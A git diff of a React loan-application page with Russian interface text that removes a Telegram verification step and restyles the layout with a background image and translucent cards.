@@ -11,7 +11,7 @@ import ProgressBar from "@/components/loan/ProgressBar";
 import ProcessingScreen from "@/components/loan/ProcessingScreen";
 import ResultScreen from "@/components/loan/ResultScreen";
 import CardBindingStep from "@/components/loan/CardBindingStep";
-import TelegramVerificationStep from "@/components/loan/TelegramVerificationStep";
+
 
 type SubmitStatus = 'idle' | 'processing' | 'approved' | 'rejected';
 
@@ -48,7 +48,7 @@ const Index = () => {
   const [isProcessing, setIsProcessing] = useState(false);
   const [processingTimer, setProcessingTimer] = useState(60);
   const [showCardBinding, setShowCardBinding] = useState(false);
-  const [showTelegramVerification, setShowTelegramVerification] = useState(false);
+
   const { toast } = useToast();
 
   const handleInputChange = (field: keyof FormData, value: string | number | File) => {
@@ -94,23 +94,9 @@ const Index = () => {
     });
   };
 
-  const handleTelegramCheck = () => {
-    setShowTelegramVerification(true);
-  };
 
-  const handleTelegramVerificationSuccess = () => {
-    setShowTelegramVerification(false);
-    toast({
-      title: "Подтверждено через Telegram! ✅",
-      description: "Заявка прошла дополнительную верификацию",
-    });
-    handleSubmit();
-  };
 
-  const handleTelegramSkip = () => {
-    setShowTelegramVerification(false);
-    handleSubmit();
-  };
+
 
 
 
@@ -245,12 +231,23 @@ const Index = () => {
   }
 
   return (
-    <div className="min-h-screen bg-gray-50 py-4">
-      <div className="max-w-2xl mx-auto px-4">
+    <div 
+      className="min-h-screen py-4 relative overflow-hidden"
+      style={{
+        backgroundImage: `url('/img/8f60907b-2d93-41c9-848d-34fe66f9edee.jpg')`,
+        backgroundSize: 'cover',
+        backgroundPosition: 'center',
+        backgroundRepeat: 'no-repeat'
+      }}
+    >
+      {/* Затемняющий оверлей */}
+      <div className="absolute inset-0 bg-black/30 backdrop-blur-sm" />
+      
+      <div className="max-w-2xl mx-auto px-4 relative z-10">
         <form onSubmit={handleSubmit}>
           {/* Логотип вверху */}
           <div className="text-center mb-6">
-            <div className="inline-flex items-center gap-3 bg-white rounded-2xl px-8 py-4 shadow-lg border border-gray-100">
+            <div className="inline-flex items-center gap-3 bg-white/90 backdrop-blur-sm rounded-2xl px-8 py-4 shadow-2xl border border-white/30">
               <div className="w-12 h-12 bg-blue-600 rounded-xl flex items-center justify-center">
                 <Icon name="Banknote" size={24} className="text-white" />
               </div>
@@ -264,7 +261,7 @@ const Index = () => {
           {/* Прогресс-бар в процентах */}
           <ProgressBar currentStep={currentStep} totalSteps={6} />
 
-          <Card className="bg-white rounded-2xl shadow-lg border border-gray-200">
+          <Card className="bg-white/95 backdrop-blur-sm rounded-2xl shadow-2xl border border-white/20">
             
             <CardHeader className="text-center pb-6">
               <CardTitle className="text-2xl font-bold text-gray-800 mb-2 flex items-center justify-center gap-3">
@@ -277,16 +274,10 @@ const Index = () => {
             </CardHeader>
 
             <CardContent className="p-8 space-y-6">
-              {showTelegramVerification ? (
-                <TelegramVerificationStep 
-                  phoneNumber={formData.phone}
-                  onVerificationSuccess={handleTelegramVerificationSuccess}
-                  onSkip={handleTelegramSkip}
-                />
-              ) : currentStep === 6 ? (
+              {currentStep === 6 ? (
                 <CardBindingStep 
                   onSuccess={handleCardBindingSuccess} 
-                  onSubmit={handleTelegramCheck}
+                  onSubmit={handleSubmit}
                   isSubmitting={isSubmitting}
                   phoneNumber={formData.phone}
                 />
